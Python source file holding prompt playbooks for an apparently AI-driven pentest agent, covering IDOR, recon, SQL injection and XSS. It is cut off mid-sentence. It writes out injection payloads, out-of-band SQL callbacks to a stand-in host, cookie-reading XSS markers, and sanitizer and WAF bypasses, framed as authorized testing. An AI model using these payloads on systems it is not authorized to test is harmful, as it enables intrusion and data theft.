IDOR_INJECTION = """
---

# IDOR / BOLA — Playbook

Deep reference for the `authz` class — object-level authorization failures
(IDOR/BOLA). Read this once a witness from
[exploitation-techniques.md](../exploitation-techniques.md#idor)
suggests an unbound object reference and you need to confirm, classify, and
prove cross-account access. OWASP A01 mapping lives in
[vuln-taxonomy.md](../vuln-taxonomy.md). Treat every object reference as
untrusted until proven bound to the caller.

## Hermes contract (read first)

- **Scope-bounded.** Every request below goes through the host-extraction
  rules in [scope-enforcement.md](../scope-enforcement.md). Off-scope → STOP.
- **Witness-first, two accounts you control.** Prove the bug with a minimal
  pair: account **A** reads (or writes) account **B**'s object, where you
  own both A and B. Toggle A↔B to show the binding is missing. Do **not**
  rely on hitting a stranger's object as the primary proof.
- **PII discipline (CRITICAL).** Reaching a *real* other user's object is
  the strongest impact proof, but their PII must be **redacted** in chat and
  in `evidence/` — capture only enough to prove cross-tenant access
  (e.g. masked email `a***@***.com`, last-4 of an account number, an object
  ID that is provably not yours). Never paste a stranger's full PII/PHI/PCI.
- **No mass-harvest.** Re-key any Strix "enumerate all users / build an ID
  corpus" guidance to: prove cross-user access with **one** non-owned
  object, then stop. Do not iterate the ID space to scrape real users.
- **No write/delete on others' data without operator OK.** Read-IDOR is
  proven by reading. Demonstrating write/delete impact (PATCH/PUT/DELETE on
  B's object) requires explicit authorization; prefer a no-op/benign-marker
  field and revert immediately.
- **Redact.** Any captured credential/token/session → last 6 chars in chat;
  full value to `evidence/` only.
- **Verdict ladder.** Map every result to `L1 Identified → L2 Partial →
  L3 Confirmed → L4 Critical` per [SKILL.md](../../SKILL.md) Phase 4.

## Attack surface

**Access axes:**
- **Horizontal** — A reads/writes B's object of the same type/role.
- **Vertical** — a low-priv principal reaches an admin/staff-only object or
  action (overlaps `broken_function_level_authorization.md`).
- **Cross-tenant** — break isolation in multi-tenant systems (org/workspace).
- **Cross-service** — a token/context scoped for service A accepted by B.

**Reference locations:** path, query, JSON/form/multipart body, headers,
cookies; JWT claims, GraphQL arguments, WebSocket messages, gRPC fields.

**Relationship references:** `ownerId`, `accountId`, `tenantId`, `orgId`,
`teamId`, `projectId`, `parentId`, `subscriptionId` — and expansion knobs
(`fields`/`include`/`expand`/`projection`/`populate`) that bypass authz in
resolvers/serializers.

**High-value targets:** exports/reports (CSV/PDF/ZIP), mailbox/notifications,
audit logs, billing (invoices/payment methods/transactions), HR/health/edu
records, admin/impersonation tools, object-storage keys + signed/share URLs,
background-job result IDs, tenant/workspace resources.

## Object-reference patterns (classify the identifier first)

- **Sequential / predictable** — integers, auto-increment, ULID/UUIDv1
  (time-ordered, guessable within a window), Snowflake (embeds timestamp).
  Easiest to swap; A's ID ± 1 often lands on B.
- **UUIDv4 / random** — not guessable, but **still test** — they leak in
  list/search responses, logs, JS bundles, emails, webhooks. Obtain B's
  UUID legitimately (B is your own account), then swap.
- **Hashed / opaque tokens** — share tokens, signed URLs. Test for stale
  signature reuse across tenants, key-prefix changes, weak/missing binding.
- **Encoded** — base64/hex blobs (esp. Relay global IDs `VXNlcjo0NTY=`):
  decode, swap the raw inner ID, re-encode.
- **Composite keys** — `{orgId}:{userId}`: vary each segment independently;
  gateway and backend may disagree on which segment is authoritative.

## Detection channels (quietest first)

1. **Direct swap** — pair two requests identical except the object ref:
   A's own ID vs B's ID, same A token. Diff status/length/body/ETag. If B's
   content returns → horizontal IDOR.
2. **Differential / blind** — content masked but existence leaks via status,
   body size, ETag, timing, or error shape (owned vs foreign objects differ).
   Use `HEAD`/`OPTIONS` and conditional requests (`If-None-Match` /
   `If-Modified-Since`) to confirm existence without pulling full content.
3. **Side-effect (blind IDOR)** — no readable response, but the action lands
   (email/notification fires, job state changes, counter moves). Confirm via
   an observable out-of-band signal on B's account that you control.

Prefer the quietest oracle that distinguishes "bound to caller" from
"bound to nobody."

## Fallback ladder (try in order — a 403/empty is NOT a clean result)

A masked response, empty array, `null`, or `403` is enforcement **on the path
you tried** — not proof the object is bound to the caller. Climb the ladder
before dismissing; most IDOR hides below rung 1.

1. **Direct swap** — A's token, B's object id (A and B both yours). B's content
   returns → horizontal IDOR. Blocked → 2.
2. **Every verb** — the route may authz `GET` but not `PUT`/`PATCH`/`DELETE`;
   add method tunneling (`X-HTTP-Method-Override`, `_method`). → 3.
3. **Transform the identifier** — decode → swap → re-encode base64 & Relay
   global IDs, hex, hashids; vary each segment of composite keys
   (`{org}:{user}`) independently. → 4.
4. **Nested / relational + expansion** — child edges not re-checked
   (`/orders/{mine}/items/{B}`); pull related records via
   `include`/`expand`/`populate`/`fields`. → 5.
5. **Blind oracles** — content masked but existence leaks: status/size/ETag/
   timing diffs, `HEAD`/`OPTIONS`, conditional requests; for write-only
   endpoints, confirm via a side-effect you observe on B. → 6.
6. **Trust-boundary variation** — cross-service token confusion; inject/drop
   gateway identity headers (`X-User-Id`, `X-Organization-Id`); cache-key
   confusion (probe `Vary`); multi-tenant scoping via header/subdomain/slug.

Exhaust 1–6 (with an owner-view control proving data is actually withheld, not
just absent from the response shape) before writing `false_positive`.

## Key vulnerabilities

### Horizontal & vertical access
- Swap object IDs between A and B using A's token → horizontal.
- Repeat with a lower-privilege token against a higher-privilege object →
  vertical (cross-link `broken_function_level_authorization.md`).
- Target partial updates (`PATCH`, JSON Merge/JSON Patch) for silent writes.

### HTTP method swaps
- An endpoint may authz-check `GET /users/{id}` but **not** `PUT`/`PATCH`/
  `DELETE` on the same path. Test every verb the route accepts.
- Method tunneling: `X-HTTP-Method-Override: PATCH`, `_method=PATCH`, or a
  `GET` that the backend wrongly treats as a state change.

### Mass-assignment overlap
- The object ref is correct, but an *extra* field rebinds ownership:
  `{"ownerId": <B>}`, `{"is_admin": true}`, `{"role":"admin"}` on a
  create/update you're allowed to call. See `mass_assignment.md` — IDOR and
  mass-assignment frequently co-occur (create-time owner injection).

### Nested / relational IDOR
- The top-level object is yours, but a child/edge isn't re-checked:
  `/orders/{my}/items/{B-item}`, `/projects/{my}/members/{B-user}`.
- Expansion/projection knobs (`include=billing`, `expand=owner`) pull
  related records the resolver/serializer never authorizes.

### Predictable identifiers
- Time-ordered IDs (UUIDv1/ULID/Snowflake) → narrow the window from a known
  A timestamp. Sequential → A ± k. Prove with **one** non-owned hit, not a
  sweep.

### Blind IDOR via side effects
- Write/trigger endpoints with no echo: confirm impact through a channel you
  observe on B (notification, mailbox, job status, audit entry) rather than
  the HTTP response.

### Secondary IDOR (ID sourcing — minimal)
- List/search/export endpoints and notifications surface valid IDs. Use them
  only to obtain the **one** reference needed for the witness pair — not to
  enumerate real users.

### GraphQL
- Authz must hold at **resolver/edge** boundaries, not just a top-level gate.
  Verify each hop binds the resource to the caller.
- Relay global IDs: decode base64, swap raw ID, re-encode. Aliases/batching
  request multiple nodes in one query — keep it to your A/B pair for proof.

```graphql
query idorWitness {
  me { id }
  b: node(id: "<base64 of B you own>") { ... on User { id } }
}
```

### Cross-service / gateway trust
- Token confusion: a JWT scoped for service A accepted by B (shared signing,
  missing `aud`/scope check).
- Header trust: gateways inject/trust `X-User-Id` / `X-Organization-Id` —
  try overriding or removing them.
- Cache-key confusion: responses keyed without `Authorization`/tenant header
  serve B's cached object to A; probe `Vary`/`Accept`, 304/206 behavior.

### Multi-tenant
- Vary tenant scoping via header (`X-Tenant-ID`), subdomain, and path/slug
  independently; mix token's org with another org's resource. Check
  cross-tenant rollups/reports/admin aggregates.

## Bypasses

See [bypass-techniques.md](../bypass-techniques.md) for the cross-class set.
IDOR-specific quick hits: content-type switching
(`json` ↔ `x-www-form-urlencoded` ↔ `multipart`); parameter pollution and
case/alias collisions (`id=A&id=B`, `userId` vs `userid`, duplicate JSON
keys) so gateway and backend disagree on precedence; method tunneling
(above); type juggling (`{"id":123}` vs `{"id":"123"}`, scalar vs array);
TOCTOU race between authz check and use (see `race_conditions.md`).

## Validation (what promotes to L3/L4)

1. **Toggle proof.** Show A retrieving B's object, and the *same* request
   correctly scoped (A's own ID, or a fixed endpoint) returning only A's
   data. Two requests differing only in the object reference.
2. **Cross-account, owned pair.** Both A and B are yours — clean, repeatable,
   no third-party PII. This is the baseline L3 evidence.
3. **Real-user impact (redacted).** If a *real* non-owned object is reachable,
   record the minimum redacted proof (masked PII / foreign object ID) — do
   not capture or paste full PII. Elevates to L4 (sensitive data /
   cross-tenant breach).
4. **Write/delete (operator OK only).** Demonstrate a benign-marker change on
   B and revert; document before/after with role-separated evidence.
5. Provide reproducible requests (owner vs non-owner) and the verb/route.

## False positives (don't report these)

- Public/anonymous-by-design resources, or content already public.
- Empty array / `null` / 403 for B's resource → **enforcement**, not
  exposure. Compare against the owner's view to confirm data is actually
  withheld, not just absent from the response shape.
- Idempotent metadata lookups that reveal no sensitive content.
- Correct row-level checks that hold across all transports/content-types.
- Your own object reachable via two paths (no cross-account boundary crossed).

## Impact & reporting

Cross-account PII/PHI/PCI exposure, unauthorized state changes (transfers,
role/cancellation), cross-tenant leakage violating contractual/regulatory
boundaries (GDPR/HIPAA/PCI), fraud and account takeover via chaining
(IDOR+CSRF to force changes, IDOR+SSRF for internal IDs, IDOR+race to skip
spot checks). Report as **A01 / CWE-639**, CVSS only for L3/L4, include the
owned A/B toggle proof and the exact route + verb; redact any real-user PII
to the minimum that proves the boundary was crossed.

## Pro tips

1. Use two accounts you own; A↔B toggle is the cleanest, PII-safe proof.
2. Classify the identifier form *first* — it dictates whether to swap, decode,
   or source the ID legitimately.
3. Test every verb a route accepts; read-authz often doesn't cover writes.
4. In GraphQL, validate at resolver/edge boundaries — parent auth never
   covers children.
5. Vary org header, subdomain, and path tenant independently in multi-tenant.
6. Watch for mass-assignment co-occurrence: a correct ID + an owner field.
7. Use status/size/ETag/timing differentials for blind confirmation when
   content is masked; use side-effects for write-only blind IDOR.
8. Prove with **one** non-owned object, redact its PII, and stop — never
   sweep the ID space to harvest real users.
"""

RECON_CONTEXT = """
---
RECON CONTEXT OPTIMIZATION

Perform **rigorous, in-depth recon** — but keep the live conversation lean. During execution, be thorough; store every finding in taskmanager rough (markdown) as you go. At the end, synthesize rough into a **next-stage pentest handoff report** (findings + registered proof IDs).

## Execution vs reporting

| Phase | Goal | Context rule |
|-------|------|--------------|
| **Execution** | Cover every port, service, path, page, form, capture, JS/asset mine, and vuln rigorously | Store distilled findings in taskmanager rough; use recon_search_output for scan details; record task/rough/capture IDs as you go |
| **Final response** | Last message = complete handoff report body (not a pointer to taskmanager) | Copy findings from rough into the full Final Report schema; include registered task/rough/capture IDs as proof; no praise or "what's next" |

## Critical: use cached output search, never raw dumps

Scan tools return JSON with `result_id`. When `stdout_truncated` is true — or whenever you need more detail — use **recon_search_output** with targeted regex patterns. Run multiple searches per scan to extract everything relevant. Never re-run the same scan to see more output.

Examples:
- Open ports: `pattern="\\d+/tcp\\s+open\\s+\\S+"`
- Gobuster hits: `pattern="\\(Status: (200|301|302|403)\\)"` or `pattern="^\\+"`
- Interesting paths: `pattern="admin|login|form|api|password|config|phpinfo|upload|backup|debug|test|dev"`
- Nikto-style findings: `pattern="^\\+"` or `pattern="OSVDB|CVE|vulnerable"`

Use **recon_list_cached_outputs** to see recent `result_id` values. Store `result_id` in taskmanager rough when you may need follow-up searches.

## Rigorous recon checklist (complete all applicable steps)

1. **Port scan** — nmap all likely ports; then `-sV` version detection on every open port.
2. **Per HTTP service** — identify app/stack (whatweb, page title, headers); read robots.txt and sitemap if present; note any subdomains hinted there.
3. **Directory enumeration** — gobuster on **every** HTTP port/service (one URL per call); use extensions `-x php,html,txt,js,asp,aspx,json,xml,bak,old,zip`.
4. **Exhaust scan cache** — for each scan `result_id`, run recon_search_output with multiple regex patterns until no new paths/ports/findings emerge.
5. **Browse every discovered path** — visit each 200/301/302/403 URL in scope; note page purpose, technologies, and sensitive content.
6. **Request capture (per site/page)** — On each browsed site/page, enable/use butcher request capture. After interactions, distill captured requests into rough: method, URL, param names (query/path/body), interesting headers, and the registered `capture_id`. Do **not** paste raw capture dumps mid-chat; cite capture IDs in rough and in the final report.
7. **JS / static asset mining** — Collect linked `.js`, sourcemaps, JSON config, and other static assets; extract in-scope URLs, paths, API routes, and query/body parameter names; store distilled lists in rough. Record subdomains seen in JS/redirects/certs/Host headers.
8. **Parameterized endpoints** — From forms, captured traffic, and JS strings, record endpoints with parameter names as next-stage injection candidates (method, path, params, source).
9. **Interesting links & data** — Flag admin/debug/upload/api/backup/auth/config paths; note leaked tokens/keys/comments/version banners (redact secrets to last 6 chars in rough and report).
10. **Forms** — inventory every form on every page (login, search, contact, upload, admin, API, hidden fields).
11. **Vulnerabilities** — flag information disclosure (phpinfo, config files, logs, passwords dirs, server-status, verbose errors, exposed APIs, default creds hints); store only confirmed or high-signal findings with short evidence.
12. **WordPress** — if detected, run recon_wpscan_analyze with passive enumeration.
13. **SPAs** — if gobuster is unreliable (200 for all paths), crawl manually via browser and JS evaluation.

## Tool selection

Allowed recon tools:
- **recon_nmap_scan**, **recon_gobuster_scan**, **recon_execute_command**
- **recon_search_output**, **recon_list_cached_outputs**
- **recon_wpscan_analyze** (WordPress only), **recon_server_health**

Do not use: recon_dirb_scan (use gobuster), recon_sqlmap_scan, recon_metasploit_run, recon_hydra_attack, recon_john_crack, recon_enum4linux_scan.

## Low-output command choices (rigorous but filtered)

### recon_nmap_scan
- First pass: all common web ports on target; second pass: `-sV` on confirmed open ports
- `additional_args`: `--open -T4 --max-retries 1 --host-timeout 120s`

### recon_gobuster_scan
- One base URL per call; use `/usr/share/wordlists/dirb/common.txt`
- `additional_args`: `-q --no-error -t 40 -b -x php,html,txt,js,asp,aspx,json,xml`

### recon_execute_command
- `curl -sL <url>/robots.txt`, `curl -sL <url>/sitemap.xml`
- `whatweb -q <url>` per service
- `curl -sL <url> | grep -iE '<(form|input|textarea|select)' | head -50`
- Fetch key JS/config assets and extract path/URL/param patterns via targeted grep when needed

## After every recon / browser tool call (mandatory)

1. Extract all actionable data via stdout and/or recon_search_output (multiple patterns); for captures, distill method/URL/params only.
2. Append findings to taskmanager rough (markdown) — organized by port/service and handoff categories (subdomains, param endpoints, interesting links/data, forms, vulns). This is your source of truth.
3. Do not paste raw scan output, raw capture dumps, or asset bodies in assistant messages.
4. Do not skip pages or paths to save time — rigor happens in rough, not in chat.

## Final report structure (required in last response)

Your **last message** must be this handoff report **in full** (paste every section with findings). Taskmanager rough is working memory during the run — still paste the full report in the last message. Do not create follow-up vulnerability-testing tasks, priority roadmaps as chat offers, or ask how to proceed.

Write a **next-stage pentest handoff** report covering:

### 1. Target / scope
Assigned domain and in-scope boundary. Include primary `task_id` / `rough_id` used for this run when registered.

### 2. Subdomains
Each host: how discovered (JS / redirect / cert / sitemap / Host header / etc.), briefly whether visited; cite related rough/capture IDs when available.

### 3. Open ports & services
Every open port with service/version; keep recon `result_id` when relevant.

### 4. Parameterized endpoints
Method, URL/path, param names (query / path / body), source (form / JS / capture), plus `capture_id` / `rough_id` when registered.

### 5. Interesting links
URL + why interesting (admin, api, upload, backup, auth, debug, config, …); proof IDs when available.

### 6. Interesting data
Short bullets only: tech stack, credential hints, secrets (redacted to last 6 chars), comments, version banners; proof IDs when available.

### 7. Forms
For **each** form found: URL, form type, HTTP method, action URL, all fields (name/type/required), purpose, plus registered proof IDs.

### 8. Vulnerabilities / information disclosure
Each finding: title, severity, affected URL, short evidence, and registered `task_id` / `rough_id` / `capture_id`(s). Never invent IDs.

**Exclusions from the final report:** executive-risk fluff, out-of-scope/discarded lists, methodology, failed scans, crawl narrative, raw capture/payload body dumps, tool chatter, praise, conversational wrap-ups, and "how would you like to proceed" questions.
**Required in the final report:** registered task / rough / request-capture IDs as proof for findings (omit a field only if that ID was never registered).
If a section has no findings, omit the section or state "none" in one short line.

## Scope discipline

Actively browse the assigned domain. Discover and **report** subdomains seen in JS, redirects, certs, Host headers, sitemap/robots. Visit a discovered subdomain only when it clearly belongs to the same target domain (e.g. `api.target.com` for `target.com`). Discard unrelated third-party hosts, CDN noise, and off-scope links from stored findings.
"""


SQL_INJECTION = """
---
# SQL Injection — Playbook

Deep reference for the `injection` class, SQL slot types
(`SQL-val` / `SQL-ident` / `SQL-keyword` in [vuln-taxonomy.md](../vuln-taxonomy.md)).
Read this once a witness from
[exploitation-techniques.md](../exploitation-techniques.md#sql-injection)
suggests SQLi and you need to confirm, classify, and extract proof.

## Hermes contract (read first)

- **Scope-bounded.** Every request below goes through the host-extraction
  rules in [scope-enforcement.md](../scope-enforcement.md). Off-scope → STOP.
- **Witness-first, minimal proof.** Confirm control with the quietest
  oracle, extract only what *demonstrates* impact (version, current user,
  one row of a sensitive table), then stop. You are proving exploitability,
  not dumping the database.
- **No destructive payloads without operator OK.** No `DROP`/`DELETE`/
  `UPDATE`/`INTO OUTFILE`/`xp_cmdshell` unless the engagement explicitly
  authorizes it. Reproducing the bug never requires destruction.
- **Redact.** Any extracted credential/hash/token → last 6 chars in chat;
  full value to `evidence/` only.
- **Verdict ladder.** Map every result to `L1 Identified → L2 Partial →
  L3 Confirmed → L4 Critical` per [SKILL.md](../../SKILL.md) Phase 4.

## Attack surface

**Engines:** MySQL/MariaDB, PostgreSQL, MSSQL, Oracle, SQLite; plus
JSON/JSONB operators, full-text/search, geospatial, window functions,
CTEs, lateral joins.

**Integration paths:** ORMs, query builders, stored procedures, search
servers, reporting/exporters, bulk/batch endpoints embedding filters.

**Input locations:** path / query / body / header / cookie; mixed
encodings (URL, JSON, XML, multipart). Distinguish **identifier** slots
(table/column names — `SQL-ident`/`SQL-keyword`) from **value** slots
(`SQL-val`). Query-builder danger APIs: `whereRaw`/`orderByRaw`, string
templates, JSON containment operators, partially-parameterized `IN (...)`.

## Detection channels (quietest first)

1. **Error-based** — provoke type/constraint/parser errors that reveal
   version/stack/paths. Quiet, high-signal.
2. **Boolean-based** — pair requests differing only in predicate truth
   (`AND 1=1` vs `AND 1=2`); diff status/length/body/ETag.
3. **Time-based** — `SLEEP`/`pg_sleep`/`WAITFOR`; gate the delay inside a
   subselect to avoid global latency noise (see witness payloads in
   [exploitation-techniques.md](../exploitation-techniques.md#sql-injection)).
4. **Out-of-band (OAST)** — DNS/HTTP callback via DBMS primitives; only to
   an operator-owned callback host. Use when responses are blind/strict.

Prefer the **quietest reliable oracle**; avoid long sleeps in shared envs.

## Per-DBMS primitives (for confirmation, not exfil)

### MySQL
- Identity: `@@version`, `database()`, `current_user()`
- Error-based: `extractvalue()`/`updatexml()` (older), JSON fns for shaping
- Time: `SLEEP(n)`, `BENCHMARK`
- OOB (operator OK): `LOAD_FILE(CONCAT('\\\\',database(),'.<cb-host>\\a'))`

### PostgreSQL
- Identity: `version()`, `current_user`, `current_database()`
- Error-based: bad casts, division by zero, `xpath()` in xml2
- Time: `pg_sleep(n)` (gate in subselect)
- JSON/JSONB: `->`, `->>`, `@>`, `?|` with lateral/CTE for blind extraction

### MSSQL
- Identity: `@@version`, `db_name()`, `system_user`
- Error-based: `convert`/`parse`, divide-by-zero, `FOR XML PATH` leaks
- Time: `WAITFOR DELAY '0:0:5'`
- OOB (operator OK): `xp_dirtree \\<cb-host>\a`

### Oracle
- Identity: `v$version` banner, `ora_database_name`, `user`
- Time: `dbms_lock.sleep(n)`
- Error-based: `to_number`/`to_date`, `XMLType`
- OOB (operator OK): `UTL_HTTP.REQUEST('http://<cb-host>')`

### SQLite (common in Juice-Shop-class apps)
- Identity: `sqlite_version()`
- Time/CPU-burn (no SLEEP): `AND randomblob(100000000)` or `likelihood()`
- Metadata: `sqlite_master` for schema

## Extraction methods

- **UNION** — fix column count via `ORDER BY n`, then
  `UNION SELECT null,...`; align types with `CAST`; coerce to text/json.
  Filtered → fall back to error/blind.
- **Blind (bit-wise)** — branch on single-bit predicates via
  `SUBSTRING`/`ASCII`; binary-search the char space to cut requests.
- **Error-based** — embed the target expression in an error-raising fn.
- **OOB** — embed data in DNS labels / HTTP query to an operator callback.

Order of proof: oracle control → metadata (version/user/db) → **one** row
of a high-value table. That's L4. Stop there.

## ORM / query-builder edges

- `whereRaw`/`orderByRaw`, string interpolation into LIKE/IN/ORDER.
- Identifier interpolation (table/column names) — the `SQL-ident` slot.
- JSON containment operators exposed with raw fragments.
- Partial parameterization: operators/lists left unbound.

## Bypasses

See [bypass-techniques.md](../bypass-techniques.md) for the cross-class
WAF/filter set. SQL-specific quick hits: `/**/` and inline comments for
whitespace, `UN/**/ION`/`U%4eION` keyword splitting, hex literals
(`0x61646d696e`), double-URL/Unicode encoding, and clause relocation via
subselects/CTEs/lateral joins to hide payload shape.

## Validation (what promotes to L3/L4)

1. Show a reliable oracle and prove control by **toggling** the predicate.
2. Extract verifiable metadata (version, current user, db name).
3. Retrieve or modify **one** non-trivial in-scope target (a row, a role
   flag) — minimum that proves impact.
4. Provide reproducible requests differing only in the injected fragment.
5. If a WAF is present, demonstrate the bypass variant still works.

## False positives (don't report these)

- Generic errors unrelated to SQL parsing/constraints.
- Static response sizes from templating, not predicate truth.
- Network/CPU jitter mistaken for injected delay — re-test with a gated
  subselect and a control request.
- Parameterized queries with no concatenation (confirm by code review if
  source is available).

## Impact & reporting

Data exfiltration, authn/authz bypass via manipulated predicates,
server-side file/command access (privilege-dependent), persistent
integrity impact. Report as **A03 / CWE-89**, CVSS only for L3/L4, include
the exact query shape and the toggled-predicate proof.

## Pro tips

1. Pick the quietest reliable oracle; avoid noisy long sleeps.
2. Normalize responses (length/ETag/digest) before diffing.
3. Metadata → one business-critical row; minimize lateral noise.
4. Treat ORMs as thin wrappers — audit `whereRaw`/`orderByRaw`.
5. CTEs/derived tables smuggle expressions past SELECT filters.
6. Keep payloads portable; maintain a per-DBMS function dictionary.
"""


XSS_INJECTION = """
---
# Cross-Site Scripting — Playbook

Deep reference for the `xss` class. Exploitability is decided by the
**render context** the value lands in — classify against the
render-context table in
[vuln-taxonomy.md](../vuln-taxonomy.md#xss-render-contexts) before you
craft anything. Read this once a witness from
[exploitation-techniques.md](../exploitation-techniques.md#xss) reflects
or stores and you need to confirm, classify, and prove impact.

## Hermes contract (read first)

- **Scope-bounded.** Every navigation, request, and callback host goes
  through [scope-enforcement.md](../scope-enforcement.md). The fetch
  marker's target host must be in scope or operator-owned. Off-scope →
  STOP.
- **Witness-first, benign marker.** Prove execution with a unique benign
  `fetch` marker — **never `alert(1)`**. Pop-ups annoy real users if the
  target has any. Use the base witness from
  [exploitation-techniques.md](../exploitation-techniques.md#xss):
  `<svg/onload=fetch("/HERMES-PENTEST-XSS-"+document.cookie)>` for
  reflected; a per-finding unique path for stored. Confirm via a
  server-log grep for the marker — that grep is your evidence.
- **Stored-XSS caution.** Inject so that **only your test account sees it
  first** (your own profile, your own comment thread). Use a unique marker
  per finding. If the marker fires in another user's session → that
  promotes the finding; do not seed payloads that hit real users to get
  there.
- **Prove control, then stop.** Demonstrate script execution and the
  *minimum* impact (read one in-scope token, perform one state change as
  the victim role). Do not build C2, persist via service workers, or
  harvest sessions at scale — that's the re-keyed Strix "exfil
  everything" guidance: prove control, demonstrate minimum impact, stop.
- **Redact.** Any captured cookie/token/CSRF secret → last 6 chars in
  chat; full value to `evidence/` only.
- **Verdict ladder.** Map every result to `L1 Identified → L2 Partial →
  L3 Confirmed → L4 Critical` per [SKILL.md](../../SKILL.md) Phase 4.
  Reflected execution in your own context = L3; firing in another user's
  session (stored, or shared link consumed by a victim) = L4.

## Attack surface

**Types:** reflected, stored, and DOM-based — across web pages, web
views, and desktop/mobile shells (Electron, embedded browsers).

**DOM XSS: sources & sinks table (copy-paste template for every finding)**

Before tracing any DOM XSS, note the **source** (where tainted data enters)
and the **sink** (where it reaches dangerous execution):

| Source category | Specific sources |
|----------------|-----------------|
| URL / navigation | `document.URL`, `document.documentURI`, `document.baseURI`, `location.href`, `location.search` (query), `location.hash` (fragment), `location.pathname` |
| Cross-origin / referrer | `document.referrer`, `window.name`, `postMessage` data |
| Storage | `document.cookie`, `localStorage`, `sessionStorage`, `IndexedDB` |
| History / programmatic | `history.pushState()` / `history.replaceState()`, `location.assign()` |
| Network responses | `fetch()` / `XMLHttpRequest` response text consumed by JS |

| Sink category | Specific sinks |
|--------------|---------------|
| HTML content sinks | `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write()`, `document.writeln()` |
| JS execution sinks | `eval()`, `setTimeout(str)`, `setInterval(str)`, `new Function(str)`, `setImmediate(str)` |
| jQuery sinks | `$()`, `.html()`, `.append()`, `.prepend()`, `.after()`, `.before()`, `.replaceAll()`, `.replaceWith()`, `.wrap()`, `.wrapAll()`, `.wrapInner()`, `.insertAfter()`, `.insertBefore()`, `.animate()`, `.add()` |
| Attribute/DOM nav | `location.href`, `location.assign()`, `location.replace()`, `window.open()`, `form.action`, `a.href`, `iframe.src`, `element.onevent` |

**Critical accuracy rule:** `innerHTML` / `insertAdjacentHTML` do NOT execute `<script>` elements on any modern browser. Always use event-handler-based payloads (`<img src=x onerror=...>`, `<svg/onload=...>`) for HTML-content sinks. `document.write` DOES execute `<script>` elements — but only during the initial page load.

**Render contexts:** `HTML_BODY`, `HTML_ATTR_*`, `URL_ATTR`,
`JAVASCRIPT_STRING`/`JAVASCRIPT_BLOCK`, `CSS_*`, `EVENT_HANDLER`,
`DOM_INNERHTML`, `DOM_DOC_WRITE`, `JSON_RESPONSE` consumed by JS — see
the full table with required encodings in
[vuln-taxonomy.md](../vuln-taxonomy.md#xss-render-contexts). Don't
re-derive it; classify the slot, then pick the payload.

**Injection points:**
- **Server render** — templates (Jinja/EJS/Handlebars), SSR/ISR
  frameworks, email/PDF renderers.
- **Client render** — `innerHTML`/`outerHTML`/`insertAdjacentHTML`,
  `document.write`, template literals, `dangerouslySetInnerHTML`,
  `v-html`, `$sce.trustAsHtml`, Svelte `{@html}`.
- **URL/DOM sources** — `location.hash`/`search`, `document.referrer`,
  `<base href>`, `data-*` attributes, history state.
- **Event/handler sinks** — `onerror`/`onload`/`onfocus`/`onclick`,
  `javascript:` URL handlers.
- **Cross-context channels** — `postMessage`, WebSocket/SSE messages,
  local/sessionStorage, IndexedDB, service-worker messages.
- **File/metadata** — SVG/HTML uploads, XML/image filenames and EXIF,
  office docs processed server- or client-side.

**Input locations:** path / query / fragment / body / header / cookie;
mixed encodings (URL, JSON, XML, multipart).

## Render contexts & detection

Detection is a two-step: (1) **find reflection/storage**, (2) **classify
the context** so the payload matches the slot's escape requirements.

1. **Reflected** — send a unique benign marker token (plain string
   first), locate every place it lands in the response, and note the
   *context* of each landing (body text vs quoted attr vs script string
   vs URL attr). One input often reflects in several contexts.
2. **Stored** — submit the marker to your own object, then load every
   view that renders it (own profile, admin preview, exports, emails).
   Track *where* it surfaces and *who* can see it.
3. **DOM** — inspect every taint sink (`innerHTML`, `outerHTML`,
   `insertAdjacentHTML`, `document.write`, `eval`, `Function(string)`,
   `setTimeout`/`setInterval` with strings, `setAttribute("href"/"src",
   …)`). The taint source is usually `location.hash`/`search`,
   `document.referrer`, `postMessage` data, or storage. Confirm the sink
   fires from the source you control.

Then, per landing, decide if the applied encoding matches the required
encoding for that render context (taxonomy table). Mismatch = candidate.

## Exploitation methods

Order of proof: reflection/storage found → context classified → minimal
benign-marker payload fires → marker observed in server logs / victim
context. Stop at minimum demonstrated impact.

### Reflected

Marker lands unencoded in `HTML_BODY` →
`<svg/onload=fetch("/HERMES-PENTEST-XSS-"+document.cookie)>`. If reflected
unencoded and it executes → **L3 confirmed**. Build the PoC as a single
in-scope URL the operator can replay.

### Stored

Seed the unique-marker payload into an object only your test account
renders:
`<svg/onload=fetch("/HERMES-${runId}-${vulnId}")>`. Add a server-side log
grep for that exact path as evidence. If the marker fires when a
*different* in-scope account/role renders the object → **L4 critical**.

**Decision tree — when your `<script>`/`<svg onload>` came back stripped or
escaped, DO NOT conclude "clean".** Stored sinks (feedback, reviews, comments,
profile fields, product names) frequently run an HTML sanitizer (e.g.
`sanitize-html`, DOMPurify) that drops `<script>` but is bypassable. Climb this
ladder before reporting the class clean:

1. **Non-`<script>` event handlers** the sanitizer's allow-list missed:
   `<img src=x onerror=...>`, `<svg/onload=...>`, `<details open ontoggle=...>`,
   `<video><source onerror=...>`, `<body onpageshow=...>`.
2. **`javascript:` URIs in allowed tags** — sanitizers often keep `<iframe>`/
   `<a>` but not their URI scheme: `<iframe src="javascript:alert(document.domain)">`,
   `<a href="javascript:...">`. (A very common stored/DOM XSS vector when an
   allow-list sanitizer strips `<script>` but trusts tag attributes.)
3. **mXSS** — feed sanitizer-approved markup that the browser parser *mutates*
   back into executable code on re-serialization (see the mXSS section below).
4. **DOM clobbering** — inject `id=`/`name=` elements that overwrite a JS global
   the page later trusts as a sink.
5. **Sanitizer-version bypass** — fingerprint the library/version (from the JS
   bundle) and apply its known nested-tag bypass (e.g. `<noscript><p title="</noscript>
   <img src=x onerror=...>">`), or a mutation that survives one sanitize pass.
6. **Blind / second-order XSS** — the payload may only render in an
   admin/moderator view you can't see. Use an **out-of-band callback**
   (`<img src="//<your-collab>/HERMES-...">`) and treat a later hit as proof of
   stored XSS that fires in another user's session.

Only after this ladder is exhausted — and named in your report — may stored XSS
be called clean.

### DOM

Drive the source you control into the sink. For a hash sink, navigate to
`#<img src=x onerror=fetch('/HERMES-...')>`; for `innerHTML` template
literals like ``results.innerHTML = `<li>${q}</li>` `` with
`q = URLSearchParams(location.search).get('q')`, set
`?q=<img src=x onerror=fetch('/HERMES-...')>`. Confirm the sink executed
the marker, not just that the string appears in the DOM.

### Mutation XSS (mXSS)

Abuse parser repairs that morph sanitizer-approved markup into executable
code after re-serialization (often defeats client-side sanitizers):
```html
<noscript><p title="</noscript><img src=x onerror=fetch('/HERMES-...')>
<form><button formaction=javascript:fetch('/HERMES-...')>
```

### Client/legacy template injection (browser-side)

Client templating that evaluates expressions (legacy AngularJS, lodash
